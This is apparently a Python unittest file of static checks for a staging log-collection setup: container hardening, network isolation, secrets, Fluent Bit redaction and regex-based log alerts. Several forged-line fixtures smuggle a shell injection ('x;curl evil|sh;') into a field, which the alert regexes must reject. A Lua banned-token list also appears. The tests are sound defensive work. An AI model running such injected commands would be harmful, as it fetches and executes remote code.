"""Static checks for log collection, redaction and log alerts (P1-T9b, ADR-013): hardened services
in deploy/staging/compose.logs.yaml, VictoriaLogs reachable by the pipeline alone with its
deleting endpoints behind the operator's key, Fluent Bit reading the journal read-only and
redacting before anything leaves, the log alerts' labels, and the wiring in staging.sh.

The redaction itself and the alerts are tested by running them: scripts/check-logs.py.
Run: python -m unittest scripts/test_staging_logs.py (pre-commit hook "staging-logs-static")."""

import re
import unittest
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent.parent
STAGING = ROOT / "deploy" / "staging"
LOGS = ROOT / "deploy" / "logs"


class _Loader(yaml.SafeLoader):
    pass


# Compose's merge tags (!override, !reset): read as the plain value
_Loader.add_multi_constructor("!", lambda loader, suffix, node: (
    loader.construct_sequence(node) if isinstance(node, yaml.SequenceNode)
    else loader.construct_mapping(node) if isinstance(node, yaml.MappingNode)
    else loader.construct_scalar(node)))


def load(path):
    return yaml.load(Path(path).read_text(), Loader=_Loader)


OVERLAY = load(STAGING / "compose.logs.yaml")
SVC = OVERLAY["services"]
ALL_COMPOSE = {f.name: load(f) for f in sorted(STAGING.glob("compose*.yaml"))}
FB = load(LOGS / "fluent-bit" / "fluent-bit.yaml")
FILTERS = load(LOGS / "fluent-bit" / "filters.yaml")
LUA = (LOGS / "fluent-bit" / "redact.lua").read_text()
ALERTS = {f.name: load(f) for f in sorted((LOGS / "alerts").glob("*.yml"))}
# The reference pack alert's whole-line pattern (deploy/logs/alerts/packs.yml, S1)
PACKS_LINE = r"^ihr-packs: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=failed$"
# The fleet runner's (deploy/logs/alerts/fleet.yml, P1-T18a): the same shape, three outcomes
FLEET_LINE = r"^ihr-fleet: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=(?:failed|deferred|held)$"
# A release window's hold past its budget (P1-T18b): only the worker's per-minute report
OVERRUN_LINE = r"^ihr-fleet: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=overrun$"
# The audit watch's (deploy/logs/alerts/audit.yml, P1-T21): an integrity check, or seal lag
AUDIT_LINE = r"^ihr-audit: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) check=(?:chain|fingerprint|triggers|unchecked) outcome=failed$"
AUDIT_SEAL_LINE = r"^ihr-audit: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) check=seal outcome=failed$"
# A new restore or offboarding event, named once (P1-T21 review S4)
AUDIT_EVENT_LINE = r"^ihr-audit: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) event=(?P<event>restore|offboarding) outcome=recorded$"
# The services each alert reads: the ones that run its command (packs: the start-up one-shot;
# fleet: that one-shot, `staging.sh fleet`, and the worker's per-minute report, S3; audit: the
# audit watch alone)
# The nightly dumper (P1-T22a; deploy/logs/alerts/dumps.yml): a held hospital, and a failed one
# with a fixed reason; the dumper alone writes them
DUMP_HELD_LINE = r"^ihr-dump: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=held$"
DUMP_FAILED_LINE = (r"^ihr-dump: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=failed "
                    r"reason=(?P<reason>lock|disk|window|dump|upload|verify|check|error)$")
HOSPITAL_LINES = {"PackApplyFailed": ("ihr-packs", PACKS_LINE, "migrate, celery"),
                  "HospitalNotServed": ("ihr-fleet", FLEET_LINE, "migrate, celery, celery-worker"),
                  "ReleaseWindowOverrun": ("ihr-fleet", OVERRUN_LINE, "celery, celery-worker"),
                  "AuditHospitalCheckFailed": ("ihr-audit", AUDIT_LINE, "audit-watch"),
                  "AuditHospitalSealLate": ("ihr-audit", AUDIT_SEAL_LINE, "audit-watch"),
                  "DumpHospitalHeld": ("ihr-dump", DUMP_HELD_LINE, "dumper")}
# A refused database role (deploy/logs/alerts/db-roles.yml, P1-T19a): our whole fixed line, a
# role and a reason code (never a value), from the services that run as a declared role
DB_ROLE_LINE = r"^ihr-db-role: refused role=(?P<role>app|owner|watch|none) reason=(?P<reason>[a-z_]{3,24})$"
DB_ROLE_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker, provisioner, migrate, audit-watch"
# A hospital schema an app process does not serve (P1-T19a review C2 and its second review): the
# app services only, a hospital-shaped schema and a fixed reason
GATED_LINE = r"^ihr-db-role: gated schema=(?P<schema>h_[a-z0-9]{10}) reason=(?P<reason>controls|extra_privileges)$"
GATED_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker"
# A refused batch sub-request (deploy/logs/alerts/batch.yml, P1-T20a): our whole fixed line from
# the web backend, a slug-shaped hospital, a reason code, a method and a URL name (no values)
BATCH_LINE = (r"^ihr-batch: refused hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) "
              r"reason=(?P<reason>not_listed|bad_url|bad_method|nested|override) "
              r"method=(?P<method>GET|POST|PUT|PATCH|DELETE|other) route=(?P<route>[A-Za-z0-9_.:-]{1,100})$")
# Postgres's own line for a failed login of one of our roles (known limit 1: a changed password)
LOGIN_FAILED = r'FATAL: +password authentication failed for user "(?P<role>ihr_app|ihr_owner|ihr_audit_watch|ihr_dump)"$'
STAGING_SH = (ROOT / "scripts" / "staging.sh").read_text()
DEPLOY_SH = (ROOT / "scripts" / "deploy.sh").read_text()
LONG_RUNNING = ("victorialogs", "fluent-bit", "vmalert")


def func(name):
    m = re.search(r"^%s\(\) \{(.*?)^\}" % re.escape(name), STAGING_SH, re.S | re.M)
    assert m, name
    return m.group(1)


def members(net):
    return {(f, s) for f, doc in ALL_COMPOSE.items() for s, spec in (doc.get("services") or {}).items()
            if net in (spec.get("networks") or [])}


class Hardening(unittest.TestCase):
    def test_services_hardened(self):
        for name in LONG_RUNNING:
            s = SVC[name]
            self.assertTrue(s["read_only"], name)
            self.assertEqual(s["cap_drop"], ["ALL"], name)
            self.assertNotIn("cap_add", s, name)
            self.assertIn("no-new-privileges:true", s["security_opt"], name)
            self.assertNotIn("privileged", s, name)
            self.assertNotIn("ports", s, name)
            self.assertNotRegex(s["user"], r"^0(:|$)", name)
            self.assertIn("mem_limit", s, name)
            self.assertEqual(s["restart"], "unless-stopped", name)
            self.assertEqual(s["logging"]["options"]["labels"], "com.docker.compose.service", name)

    def test_images_pinned(self):
        want = {"victorialogs": "victoriametrics/victoria-logs:v", "fluent-bit": "fluent/fluent-bit:",
                "vmalert": "victoriametrics/vmalert:v", "logs-data": "prom/alertmanager:v"}
        for name, prefix in want.items():
            self.assertTrue(SVC[name]["image"].startswith(prefix), name)
            self.assertRegex(SVC[name]["image"], r"@sha256:[0-9a-f]{64}$", name)
        # never a commercial build
        self.assertNotIn("enterprise", (STAGING / "compose.logs.yaml").read_text())

    def test_no_docker_socket_and_only_the_journal_from_the_host(self):
        text = (STAGING / "compose.logs.yaml").read_text()
        self.assertNotIn("docker.sock", text)
        for name in LONG_RUNNING:
            host = [v for v in SVC[name].get("volumes", []) if v.startswith("/")]
            if name == "fluent-bit":
                self.assertEqual(host, ["/var/log/journal:/var/log/journal:ro"])
            else:
                self.assertEqual(host, [], name)

    def test_one_off_only_fixes_ownership(self):
        s = SVC["logs-data"]
        self.assertEqual(s["network_mode"], "none")
        self.assertEqual(sorted(s["cap_add"]), ["CHOWN", "FOWNER"])
        self.assertEqual(s["restart"], "no")
        self.assertIn("logs-data", re.search(r"MON_ONESHOTS='([^']*)'", STAGING_SH).group(1).split("|"))


class Isolation(unittest.TestCase):
    def test_logs_network_members(self):
        """VictoriaLogs answers queries and deletes nothing without a key, but has no login at
        all for reading: only the pipeline and Prometheus may reach it."""
        net = OVERLAY["networks"]["logs"]
        self.assertTrue(net["internal"])
        self.assertEqual(net["ipam"]["config"][0]["subnet"], "${IHR_LOGS_NET:-10.203.0.32/28}")
        self.assertEqual(members("logs"), {("compose.logs.yaml", n) for n in ("victorialogs", "fluent-bit", "vmalert", "prometheus")}
                         | {("compose.logs-archive.yaml", "logs-archive"), ("compose.logs-archive.local.yaml", "logs-archive"),
                            # Grafana's read-only door (P1-T9d): reads /select/logsql/ only
                            ("compose.dashboards.yaml", "logs-reader")})

    def test_victorialogs_on_logs_alone(self):
        self.assertEqual(list(SVC["victorialogs"]["networks"]), ["logs"])
        self.assertEqual(SVC["fluent-bit"]["networks"], ["logs"])
        self.assertEqual(sorted(SVC["vmalert"]["networks"]), ["alerting", "logs"])

    def test_store_needs_a_password_and_allows_no_cross_origin_reads(self):
        """While the operator's SSH tunnel is open, a web page in their browser must not read the
        store (CORS), and DNS rebinding meets the password. P1-T9b review."""
        cmd = SVC["victorialogs"]["command"]
        for flag in ("-httpAuth.username=ihr-logs", "-httpAuth.password=file:///run/ihr-logs/http-password",
                     "-http.disableCORS", "-metricsAuthKey=file:///run/ihr-logs/metrics-key"):
            self.assertIn(flag, cmd)
        self.assertEqual(SVC["fluent-bit"]["env_file"], ["secrets/logs-shipper.env"])
        (out,) = FB["pipeline"]["outputs"]
        self.assertEqual((out["http_user"], out["http_passwd"]), ("ihr-logs", "${IHR_LOGS_HTTP_PASSWORD}"))
        vma = SVC["vmalert"]["command"]
        self.assertIn("-datasource.basicAuth.passwordFile=/run/ihr-logs/http-password", vma)
        self.assertNotIn("-datasource.basicAuth.password=", " ".join(vma))
        # secrets made once, mode 600, never printed; the smoke sends the password on stdin
        sec = func("logs_secrets")
        for name in ("logs-admin-key", "logs-http-password", "logs-shipper.env", "logs-metrics-key"):
            self.assertIn("write_secret " + name, sec)
        self.assertIn('< "$SECRETS/logs-http-password"', func("vl_get"))
        self.assertIn("reading the store without its password is refused", func("logs_smoke"))

    def test_deleting_needs_the_operators_key(self):
        cmd = SVC["victorialogs"]["command"]
        for flag in ("deleteAuthKey", "partitionManageAuthKey", "forceMergeAuthKey", "forceFlushAuthKey",
                     "logNewStreamsAuthKey", "flagsAuthKey", "pprofAuthKey"):
            self.assertIn("-%s=file:///run/ihr-logs/admin-key" % flag, cmd)
        self.assertIn("./secrets/logs-admin-key:/run/ihr-logs/admin-key:ro", SVC["victorialogs"]["volumes"])
        # nothing else gets the key
        for name, s in SVC.items():
            if name != "victorialogs":
                self.assertFalse([v for v in s.get("volumes", []) if "logs-admin-key" in v], name)
        self.assertIn("logs_secrets", func("monitoring_init"))
        up = func("monitoring_up")
        self.assertLess(up.index("logs_secrets"), up.index("monitoring_config"))

    def test_retention(self):
        cmd = SVC["victorialogs"]["command"]
        self.assertIn("-retentionPeriod=${IHR_LOGS_RETENTION_DAYS:-180}d", cmd)
        self.assertIn("-retention.maxDiskSpaceUsageBytes=${IHR_LOGS_MAX_SIZE:-20GiB}", cmd)

    def test_ops_tunnel_binds_this_machine_only(self):
        t = func("ops_tunnel")
        self.assertIn('-L "127.0.0.1:9428:$vl:9428"', t)
        self.assertIn('-L "127.0.0.1:8880:$vma:8880"', t)


class FluentBit(unittest.TestCase):
    def test_reads_the_journal_as_nobody_with_its_group(self):
        s = SVC["fluent-bit"]
        self.assertEqual(s["user"], "65534:65534")
        self.assertEqual(s["group_add"], ["${IHR_JOURNAL_GID:?}"])
        self.assertIn('IHR_JOURNAL_GID="$(getent group systemd-journal | cut -d: -f3)"', func("compose"))
        (inp,) = FB["pipeline"]["inputs"]
        self.assertEqual(inp["name"], "systemd")
        self.assertEqual(inp["path"], "/var/log/journal")
        self.assertTrue(inp["db"].startswith("/state/"))
        self.assertEqual(inp["storage.type"], "filesystem")
        self.assertNotIn("systemd_filter", inp)  # the whole server (owner, Q-O6)

    def test_redaction_runs_before_the_output(self):
        self.assertEqual(FB["includes"], ["filters.yaml"])
        filters = FILTERS["pipeline"]["filters"]
        # rules/logs.yml selects these by name: renaming one would silence LogRedactionDrops,
        # LogShippingFailing and LogLinesLost
        self.assertEqual([f["alias"] for f in filters], ["shape", "redact"])
        rules_text = (ROOT / "deploy" / "monitoring" / "prometheus" / "rules" / "logs.yml").read_text()
        self.assertIn('fluentbit_filter_drop_records_total{name=~"shape|redact"}', rules_text)
        self.assertIn('{name="victorialogs"}', rules_text)
        # at info it logs every flush, and that line would come back through the journal forever
        self.assertEqual(FB["service"]["log_level"], "warn")
        self.assertEqual([(f["name"], f["call"], f["match"]) for f in filters],
                         [("lua", "shape", "*"), ("lua", "redact", "*")])
        for f in filters:
            # protected mode (the default): a Lua error drops the record, never passes it raw
            self.assertNotIn("protected_mode", f)
            self.assertEqual(f["script"], "/fluent-bit/etc/ihr/redact.lua")
        self.assertNotIn("filters", FB["pipeline"])
        self.assertIn("../logs/fluent-bit:/fluent-bit/etc/ihr:ro", SVC["fluent-bit"]["volumes"])

    def test_output(self):
        (out,) = FB["pipeline"]["outputs"]
        self.assertEqual((out["name"], out["host"], out["port"]), ("http", "victorialogs", 9428))
        self.assertEqual(out["alias"], "victorialogs")
        self.assertEqual(out["uri"], "/insert/jsonline?_stream_fields=host,source,service&_msg_field=msg&_time_field=date")
        self.assertEqual(out["retry_limit"], "no_limits")
        self.assertIn("storage.total_limit_size", out)
        self.assertNotIn("tls", out)  # an internal network; nothing leaves the server

    def test_lua_never_prints_or_reaches_out(self):
        # print() would go to Fluent Bit's own log, which comes back through the journal raw
        for banned in ("print(", "io.", "os.", "require(", "require \"", "loadstring", "dofile"):
            self.assertNotIn(banned, LUA)
        self.assertIn("function shape(tag, ts, r)", LUA)
        self.assertIn("function redact(tag, ts, r)", LUA)
        # only an allow-list of journald fields is kept (no _CMDLINE, no capabilities)
        self.assertNotIn("_CMDLINE", LUA)

    def test_keycloak_user_name_rule(self):
        """Owner, Q-O7: the typed user name of a 'user not found' sign-in is dropped; a real
        account's is kept."""
        self.assertIn("local KC_NO_ACCOUNT = { user_not_found = true, invalid_user = true, user_not_found_by_email = true }", LUA)
        self.assertIn('local real_user = f.userId and f.userId ~= "" and f.userId ~= "null" and not KC_NO_ACCOUNT[f.error or ""]', LUA)
        self.assertIn('v = real_user and v or "<dropped>"', LUA)
        # event fields only from a strictly parsed line with Keycloak's fixed head
        self.assertIn("if not kv or not kc_head_ok(kv) then", LUA)
        self.assertIn('if r.source == "container" and r.service == "keycloak" then keycloak_event(r) end', LUA)
        self.assertIn('r._TRANSPORT == "journal" and r._COMM == "dockerd" and r._UID == "0"', LUA)
        # never Keycloak's events at TRACE (request URIs with codes, cookies)
        self.assertNotRegex((STAGING / "compose.yaml").read_text(), r"(?i)org\.keycloak\.events.{0,20}trace")


class Labels(unittest.TestCase):
    def test_every_logging_block_names_the_service(self):
        for f in sorted(STAGING.glob("compose*.yaml")):
            text = f.read_text()
            for m in re.finditer(r'(?m)^(\s*)tag: "indiehr/\{\{\.Name\}\}"\n', text):
                nxt = text[m.end():].splitlines()[0]
                self.assertEqual(nxt.strip(), "labels: com.docker.compose.service", f.name)
        self.assertIn('"labels": "com.docker.compose.service"', (ROOT / "deploy" / "host" / "bootstrap.sh").read_text())


class LogAlerts(unittest.TestCase):
    def rules(self):
        for fname, doc in ALERTS.items():
            for g in doc["groups"]:
                self.assertEqual(g["type"], "vlogs", fname)
                for r in g["rules"]:
                    yield fname, r

    def test_labels_and_text(self):
        """The address is named on purpose (owner, Q-O8), and only the checked client_ip field.
        The reference pack alert (P1-T15a) and the fleet alert (P1-T18a) name only the hospital,
        read from our own fixed line."""
        names = []
        for fname, r in self.rules():
            names.append(r["alert"])
            self.assertIn(r["labels"]["severity"], {"critical", "warning"}, r["alert"])
            by = re.findall(r"stats by \(([^)]*)\)", r["expr"])
            if r["alert"] in HOSPITAL_LINES:
                prefix, pattern, services = HOSPITAL_LINES[r["alert"]]
                self.assertEqual(by, ["hospital"], r["alert"])
                # container lines (redact.lua) of the services that write the line only (never the
                # web backend, which logs request paths), and our whole fixed line (S1)
                self.assertRegex(r["expr"], r"^_time:\d+[hm] source:=container service:in\(" + re.escape(services) + r"\) "
                                 r'"' + prefix + r': hospital=" \| extract_regexp "' + re.escape(pattern) + r'" '
                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ', r["alert"])
                allowed = r"^\$(labels\.hospital|value)$"
                # the mailed command never carries text from the log line
                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
            elif r["alert"] == "AuditEventRecorded":
                self.assertEqual(by, ["hospital, event"], r["alert"])
                self.assertRegex(r["expr"], r'^_time:1h source:=container service:in\(audit-watch\) "ihr-audit: hospital=" '
                                 r'\| extract_regexp "' + re.escape(AUDIT_EVENT_LINE) + r'" '
                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ')
                allowed = r"^\$(labels\.hospital|labels\.event|value)$"
                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
            elif r["alert"] == "DumpHospitalFailed":
                self.assertEqual(by, ["hospital, reason"], r["alert"])
                self.assertRegex(r["expr"], r'^_time:24h source:=container service:in\(dumper\) "ihr-dump: hospital=" '
                                 r'\| extract_regexp "' + re.escape(DUMP_FAILED_LINE) + r'" '
                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ')
                allowed = r"^\$(labels\.hospital|labels\.reason|value)$"
                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
            elif r["alert"] == "DatabaseRoleRefused":
                self.assertEqual(by, ["reason"], r["alert"])
                self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:in\(" + re.escape(DB_ROLE_SERVICES)
                                 + r"\) \"ihr-db-role: refused\" \| extract_regexp \"" + re.escape(DB_ROLE_LINE) + r"\" ")
                allowed = r"^\$(labels\.reason|value)$"
                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
            elif r["alert"] == "DatabaseSchemaGated":
                self.assertEqual(by, ["schema"], r["alert"])
                self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:in\(" + re.escape(GATED_SERVICES)
                                 + r"\) \"ihr-db-role: gated\" \| extract_regexp \"" + re.escape(GATED_LINE) + r"\" ")
                allowed = r"^\$(labels\.schema|value)$"
                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
            elif r["alert"] == "BatchRequestRefused":
                self.assertEqual(by, ["hospital"], r["alert"])
                # the web backend writes it (it runs the batch); our whole fixed line only
                self.assertRegex(r["expr"], r'^_time:\d+[hm] source:=container service:in\(backend\) "ihr-batch: refused" '
                                 r'\| extract_regexp "' + re.escape(BATCH_LINE) + r'" '
                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ')
                allowed = r"^\$(labels\.hospital|value)$"
                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
            elif r["alert"] == "DatabaseRoleLoginFailed":
                self.assertEqual(by, ["role"], r["alert"])
                # the db container's own lines only
                self.assertRegex(r["expr"], r'^_time:\d+m source:=container service:=db "password authentication failed '
                                 r'for user" \| extract_regexp "' + re.escape(LOGIN_FAILED.replace('"', '\\"')) + r'" ')
                allowed = r"^\$(labels\.role|value)$"
                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
            else:
                self.assertLessEqual(set(by), {"client_ip"}, r["alert"])
                # container lines only: journald's own fields say Docker wrote them (redact.lua)
                self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:=(keycloak|traefik) ", r["alert"])
                allowed = r"^\$(labels\.client_ip|value)$"
            for ref in re.findall(r"\{\{(.*?)\}\}", r["annotations"]["summary"]):
                self.assertRegex(ref.strip(), allowed, r["alert"])
        self.assertEqual(sorted(names), ["AuditEventRecorded", "AuditHospitalCheckFailed", "AuditHospitalSealLate",
                                         "BatchRequestRefused", "DatabaseRoleLoginFailed", "DatabaseRoleRefused", "DatabaseSchemaGated",
                                         "DumpHospitalFailed", "DumpHospitalHeld",
                                         "FailedSignInsFromAddress", "HospitalNotServed", "PackApplyFailed",
                                         "RateLimitedAddress", "ReleaseWindowOverrun", "SignInLockoutStorm",
                                         "SignInLockoutsFromAddress"])

    def test_pack_line_is_ours_alone(self):
        """S1: the rule's regex takes only our own whole line with a slug-shaped hospital; text
        anyone can put in a request path or a longer line is never a hospital."""
        [expr] = [r["expr"] for f, r in self.rules() if f == "packs.yml"]
        self.assertIn('extract_regexp "%s"' % PACKS_LINE, expr)
        line = re.compile(PACKS_LINE)
        self.assertEqual(line.match("ihr-packs: hospital=alpha outcome=failed")["hospital"], "alpha")
        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-packs: hospital=fake outcome=failed" 404 179',
                       "Not Found: /api/ihr-packs: hospital=fake outcome=failed",
                       "ihr-packs: hospital=x;curl evil|sh; outcome=failed",
                       "ihr-packs: hospital=fake outcome=failed (and more)",
                       "ihr-packs: hospital=Fake outcome=failed",
                       "ihr-packs: hospital=ab outcome=failed",
                       "ihr-packs: hospital=beta outcome=deferred",
                       "ihr-packs: hospital=fake outcome=failed\nmore"):
            self.assertIsNone(line.search(forged), forged)

    def test_batch_line_is_ours_alone(self):
        """P1-T20a: only the batch view's whole refusal line; never a request path, a longer
        line or a value. The view writes exactly this line (batch.refusal_line)."""
        [rule] = [r for _, r in self.rules() if r["alert"] == "BatchRequestRefused"]
        self.assertEqual(rule["labels"]["severity"], "warning")
        line = re.compile(BATCH_LINE)
        ok = "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=users-list"
        self.assertEqual(line.match(ok)["hospital"], "alpha")
        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-batch: refused hospital=fake reason=not_listed method=GET route=x" 404 179',
                       "Not Found: /ihr-batch: refused hospital=fake reason=not_listed method=GET route=x",
                       "ihr-batch: refused hospital=x;curl evil|sh; reason=not_listed method=GET route=x",
                       "ihr-batch: refused hospital=alpha reason=forged method=GET route=x",
                       "ihr-batch: refused hospital=alpha reason=not_listed method=get route=x",
                       "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=/api/v1/users/",
                       "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=x (and more)",
                       "ihr-batch: refused hospital=alpha reason=not_listed method=GET route=x\nmore"):
            self.assertIsNone(line.search(forged), forged)
        code = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "batch.py").read_text()
        self.assertIn('REFUSAL_PREFIX = "ihr-batch: refused"', code)
        self.assertIn('f"{REFUSAL_PREFIX} hospital={slug} reason={reason} method={method} route={route}"', code)

    def test_fleet_line_is_ours_alone(self):
        """As the pack line (S1), for the fleet runner's line (P1-T18a): only the three outcomes
        of a hospital that is not served, never "done" or a busy notice."""
        [expr] = [r["expr"] for _, r in self.rules() if r["alert"] == "HospitalNotServed"]
        self.assertIn('extract_regexp "%s"' % FLEET_LINE, expr)
        line = re.compile(FLEET_LINE)
        for outcome in ("failed", "deferred", "held"):
            self.assertEqual(line.match(f"ihr-fleet: hospital=alpha outcome={outcome}")["hospital"], "alpha")
        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-fleet: hospital=fake outcome=failed" 404 179',
                       "Not Found: /api/ihr-fleet: hospital=fake outcome=failed",
                       "ihr-fleet: hospital=x;curl evil|sh; outcome=failed",
                       "ihr-fleet: hospital=fake outcome=failed (and more)",
                       "ihr-fleet: hospital=Fake outcome=held",
                       "ihr-fleet: hospital=ab outcome=failed",
                       "ihr-fleet: hospital=beta outcome=done",
                       "ihr-fleet: hospital=beta outcome=stopped",
                       "ihr-fleet: hospital=beta outcome=overrun",
                       "ihr-fleet: hospital=delta busy: trying again in 5 s",
                       "ihr-fleet: hospital=fake outcome=failed\nmore"):
            self.assertIsNone(line.search(forged), forged)
        # The runner writes exactly this line (ihr_platform/fleet.py log_line)
        fleet = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "fleet.py").read_text()
        self.assertIn('return f"ihr-fleet: hospital={slug} outcome={outcome}"', fleet)

    def test_overrun_line_is_ours_alone(self):
        """P1-T18b: the window's budget alert takes only the worker's whole "overrun" line,
        never another outcome, and only from the worker (no one-shot writes it)."""
        [rule] = [r for _, r in self.rules() if r["alert"] == "ReleaseWindowOverrun"]
        self.assertIn('extract_regexp "%s"' % OVERRUN_LINE, rule["expr"])
        self.assertIn("service:in(celery, celery-worker) ", rule["expr"])
        self.assertEqual(rule["labels"]["severity"], "critical")
        line = re.compile(OVERRUN_LINE)
        self.assertEqual(line.match("ihr-fleet: hospital=alpha outcome=overrun")["hospital"], "alpha")
        for forged in ("ihr-fleet: hospital=alpha outcome=held",
                       "ihr-fleet: hospital=alpha outcome=overrun (late)",
                       "ihr-fleet: hospital=x;curl evil|sh; outcome=overrun",
                       'GET /api/ihr-fleet: hospital=fake outcome=overrun" 404 179'):
            self.assertIsNone(line.search(forged), forged)
        tasks = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "tasks.py").read_text()
        self.assertIn('fleet.log_line(slug, "overrun")', tasks)

    def test_audit_line_is_ours_alone(self):
        """P1-T21: the audit watch's whole line only, a known check, and from the watch alone;
        the watch writes exactly this line, with the database's slug (ihr_audit/watch.py)."""
        rules = {r["alert"]: r for _, r in self.rules()}
        failed, late = rules["AuditHospitalCheckFailed"], rules["AuditHospitalSealLate"]
        self.assertIn('extract_regexp "%s"' % AUDIT_LINE, failed["expr"])
        self.assertIn('extract_regexp "%s"' % AUDIT_SEAL_LINE, late["expr"])
        self.assertEqual(failed["labels"]["severity"], "critical")
        self.assertEqual(late["labels"]["severity"], "warning")
        for rule in (failed, late):
            self.assertIn("source:=container service:in(audit-watch) ", rule["expr"])
        line, seal = re.compile(AUDIT_LINE), re.compile(AUDIT_SEAL_LINE)
        for check in ("chain", "fingerprint", "triggers", "unchecked"):
            self.assertEqual(line.match(f"ihr-audit: hospital=alpha check={check} outcome=failed")["hospital"], "alpha")
            self.assertIsNone(seal.search(f"ihr-audit: hospital=alpha check={check} outcome=failed"))
        self.assertEqual(seal.match("ihr-audit: hospital=alpha check=seal outcome=failed")["hospital"], "alpha")
        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-audit: hospital=fake check=chain outcome=failed" 404 179',
                       "Not Found: /api/ihr-audit: hospital=fake check=chain outcome=failed",
                       "ihr-audit: hospital=x;curl evil|sh; check=chain outcome=failed",
                       "ihr-audit: hospital=fake check=chain outcome=failed (and more)",
                       "ihr-audit: hospital=Fake check=chain outcome=failed",
                       "ihr-audit: hospital=ab check=chain outcome=failed",
                       "ihr-audit: hospital=beta check=seal outcome=failed",
                       "ihr-audit: hospital=beta check=everything outcome=failed",
                       "ihr-audit: hospital=beta check=chain outcome=ok",
                       "ihr-audit: hospital=fake check=chain outcome=failed\nmore"):
            self.assertIsNone(line.search(forged), forged)
        # the invalid-slug fallback (S6) is itself slug-shaped: the hospital is still named
        self.assertEqual(line.match("ihr-audit: hospital=invalid-slug check=chain outcome=failed")["hospital"],
                         "invalid-slug")
        watch = (ROOT / "plugins" / "ihr_platform" / "ihr_audit" / "watch.py").read_text()
        self.assertIn('return f"ihr-audit: hospital={slug} check={check} outcome=failed"', watch)
        self.assertIn('return slug if isinstance(slug, str) and SLUG_RE.match(slug) else INVALID_SLUG', watch)
        self.assertIn('INVALID_SLUG = "invalid-slug"', watch)

    def test_audit_event_line_is_ours_alone(self):
        """P1-T21 review S4: a new restore or offboarding event is mailed once, from the watch's
        own whole line only, naming the hospital and the kind of event."""
        [rule] = [r for _, r in self.rules() if r["alert"] == "AuditEventRecorded"]
        self.assertEqual(rule["labels"]["severity"], "warning")
        self.assertIn("source:=container service:in(audit-watch) ", rule["expr"])
        self.assertIn('extract_regexp "%s"' % AUDIT_EVENT_LINE, rule["expr"])
        line = re.compile(AUDIT_EVENT_LINE)
        self.assertEqual(line.match("ihr-audit: hospital=alpha event=restore outcome=recorded")["event"], "restore")
        self.assertEqual(line.match("ihr-audit: hospital=alpha event=offboarding outcome=recorded")["hospital"], "alpha")
        for forged in ("ihr-audit: hospital=alpha event=deletion outcome=recorded",
                       "ihr-audit: hospital=alpha event=restore outcome=recorded (forged)",
                       "ihr-audit: hospital=Alpha event=restore outcome=recorded",
                       'GET /api/ihr-audit: hospital=fake event=restore outcome=recorded" 404 179',
                       "ihr-audit: hospital=alpha check=chain outcome=failed"):
            self.assertIsNone(line.search(forged), forged)
        watch = (ROOT / "plugins" / "ihr_platform" / "ihr_audit" / "watch.py").read_text()
        self.assertIn('return f"ihr-audit: hospital={slug} event={kind} outcome=recorded"', watch)

    def test_db_role_line_is_ours_alone(self):
        """P1-T19a: only our whole refusal line, a known role and a reason code; never a request
        path or a longer line. The code writes exactly this line (db_roles.refusal_line)."""
        [rule] = [r for _, r in self.rules() if r["alert"] == "DatabaseRoleRefused"]
        self.assertEqual(rule["labels"]["severity"], "critical")
        line = re.compile(DB_ROLE_LINE)
        self.assertEqual(line.match("ihr-db-role: refused role=app reason=superuser")["reason"], "superuser")
        for forged in ('10.0.0.9 - - [x] "GET /ihr-db-role: refused role=app reason=forged" 404 179',
                       "Not Found: /ihr-db-role: refused role=app reason=forged",
                       "ihr-db-role: refused role=app reason=superuser (and more)",
                       "ihr-db-role: refused role=root reason=forged",
                       "ihr-db-role: refused role=app reason=x;curl evil|sh;",
                       "ihr-db-role: refused role=app reason=superuser\nmore"):
            self.assertIsNone(line.search(forged), forged)
        roles = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "db_roles.py").read_text()
        self.assertIn('return f"{REFUSAL_PREFIX} role={declared_role} reason={reason}"', roles)
        self.assertIn('REFUSAL_PREFIX = "ihr-db-role: refused"', roles)
        self.assertIn('os.write(2, f"{line}\\n".encode())', roles)

    def test_gated_line_is_ours_alone(self):
        """P1-T19a second review: a gated hospital schema, named every minute by the worker; only
        our whole line, a hospital-shaped schema and a fixed reason."""
        [rule] = [r for _, r in self.rules() if r["alert"] == "DatabaseSchemaGated"]
        self.assertEqual(rule["labels"]["severity"], "critical")
        line = re.compile(GATED_LINE)
        self.assertEqual(line.match("ihr-db-role: gated schema=h_ab12cd34ef reason=controls")["schema"], "h_ab12cd34ef")
